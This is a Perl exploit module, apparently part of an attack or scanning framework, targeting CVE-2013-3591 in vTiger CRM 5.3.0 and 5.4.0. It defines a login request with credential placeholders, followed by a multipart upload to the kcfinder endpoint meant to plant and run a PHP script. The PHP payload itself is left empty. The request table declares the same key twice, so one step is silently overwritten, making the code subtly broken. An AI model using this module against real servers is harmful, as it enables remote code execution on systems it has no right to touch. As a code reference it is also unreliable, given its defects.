package VTIGER::MSF::VtigerPhpExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "VtigerPhpExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2013-3591",
  DESCRIPTION => "

      vTiger CRM allows an authenticated user to upload files to embed within documents.

      Due to insufficient privileges on the 'files' upload folder, an attacker can upload a PHP

      script and execute arbitrary PHP code remotely.



      This module was tested against vTiger CRM v5.4.0 and v5.3.0.

      ",
  METHOD => "POST",
  MSF_MODULE => "vtiger_php_exec",
  PATH => "kcfinder/browse.php?type=files&lng=en&act=upload?",
  PATHS => ["kcfinder/browse.php?type=files&lng=en&act=upload"],
  PAYLOAD => "",
  REFERENCES => [
    "https://community.rapid7.com/community/metasploit/blog/2013/10/30/seven-tricks-and-treats",
  ],
  TITLE => "vTigerCRM v5.4.0/v5.3.0 Authenticated Remote Code Execution",


  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #2 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'index.php',
      PAYLOAD      => 'module=Users&action=Authenticate&return_module=Users&return_action=Login&user_name=__USERNAME__&user_password=__PASSWORD__',
      TEXT   => 'Sending Exploit #1 Request : [POST] /index.php',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'kcfinder/browse.php',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #2 Request : [POST] /kcfinder/browse.php',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'multipart/form-data; boundary=_Part_383_2713744736_2893190289',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
